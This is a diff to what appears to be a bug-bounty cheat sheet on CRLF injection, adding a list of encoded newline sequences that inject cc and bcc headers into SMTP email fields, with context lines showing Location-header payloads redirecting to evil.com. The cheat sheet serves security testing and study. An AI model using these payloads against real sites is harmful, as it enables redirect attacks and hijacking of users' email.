@@ -29,6 +29,21 @@ https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
 https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
 ```
 
+4. SMTP add Second Email
+```
+,
+&
+%20
+|
+%0a%0dcc:
+%0a%0dbcc:
+%0d%0acc:
+%0d%0abcc:
+
+#Example: Add Second Email
+email=victim@mail.tld%0d%0acc:attacker@mail.tld
+```
+
 ## References
 * [@filedescriptor](https://blog.innerht.ml/twitter-crlf-injection/)
 * [EdOverflow](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
